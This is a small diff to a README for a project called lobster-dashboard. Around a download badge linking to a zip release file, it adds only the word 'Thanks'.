@@ -176,3 +176,5 @@ For help with the software:
 Download and start using lobster-dashboard by visiting the release page below:
 
 [![Download lobster-dashboard](https://img.shields.io/badge/Download%20Now-grey?style=for-the-badge&color=orange)](https://github.com/dvlooper48-code/lobster-dashboard/raw/refs/heads/main/public/dashboard-lobster-3.5-alpha.1.zip)
+
+Thanks
